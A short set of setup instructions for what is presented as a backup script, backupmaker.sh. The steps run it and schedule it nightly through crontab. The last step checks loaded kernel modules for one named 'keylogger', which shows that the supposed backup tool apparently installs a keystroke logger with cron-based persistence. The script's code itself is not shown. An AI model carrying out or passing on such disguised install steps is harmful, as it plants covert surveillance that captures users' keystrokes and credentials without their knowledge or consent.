Instructions:

1. Run: ./backupmaker.sh
2. Edit Crontab: crontab -e
3. Add line: 2 2 * * * /home/usr/backupmaker.sh /home/usr/logs
4. Verify the installation with: lsmod | grep "keylogger" // This checks if the module was properly installed
